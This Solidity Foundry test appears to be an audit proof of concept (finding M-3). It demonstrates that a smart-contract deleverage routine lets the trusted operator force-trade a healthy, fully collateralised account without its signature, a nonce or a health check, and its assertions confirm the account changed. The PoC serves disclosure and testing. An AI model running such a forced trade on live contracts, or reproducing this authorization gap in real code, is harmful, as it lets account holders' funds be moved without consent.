// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./TransactionProcessor.Deleverage.t.sol";
import "forge-std/console.sol";

/// @title PoC (M-3, part 2): Deleverage force-trades a HEALTHY account with no signature, no nonce, no health gate
/// @notice DeleverageTransLib.process authorizes ONLY via signerManager.checkSigner(account, namedAddress) for both
/// parties — i.e. "is this address a registered signer on the account". There is NO signature recovery, NO nonce,
/// and NO maintenance-margin / bankruptcy precondition. So the trusted operator (onlyTxBatcher) can name any healthy
/// account as the "deleveragable" — using that account's own owner address, which is always a registered signer —
/// and force a trade against it without its consent. This reuses the project's own deleverage harness.
contract PoC_DeleverageNoConsent is TransactionProcessorDeleverageTest {
    function test_PoC_deleverageHealthyAccountWithoutConsent() public {
        // C_OWNER is a normal, healthy, fully-collateralized account (100,000 collateral, no open position).
        AccountPosition memory beforePos = positionManager.getAccountPositionByUID(C_OWNER_UID);
        (int256 v, int256 r) = riskContract.getAccountPositionStatus(beforePos);
        assertLe(r, v * FXP_32_ONE, "precondition: deleveragable account is healthy / over-collateralized");
        int256 cColBefore = beforePos.collateralAmount;

        // The operator names cOwner (the victim's OWN registered owner key) as the deleveragable address — NO
        // signature from cOwner is required or provided. The deleverager is an operator-chosen counterparty.
        // This is exactly the project's own _defaultDeleverage, submitted through the real txBatcher relay path.
        Deleverage memory d = _buildDeleverage(
            cPositionId, deployerPositionId, cOwner, msgSender, deployerUid, synthAssetId, 1, 1, 1
        );
        _executeDeleverage(d); // relayed by the trusted txBatcher — no victim consent, no health check

        AccountPosition memory afterPos = positionManager.getAccountPositionByUID(C_OWNER_UID);

        // The healthy account was force-traded: collateral and/or synthetic changed with no signature and no health
        // precondition — proving "only unhealthy accounts can be deleveraged" is NOT enforced on-chain.
        assertTrue(
            afterPos.collateralAmount != cColBefore || afterPos.assets.length != beforePos.assets.length,
            "BUG: healthy account force-deleveraged with no signature/nonce/health precondition"
        );

        console.log("healthy deleveragable value before (FXP):", v);
        console.log("collateral before:", uint256(cColBefore));
        console.log("collateral after :", uint256(afterPos.collateralAmount));
    }
}
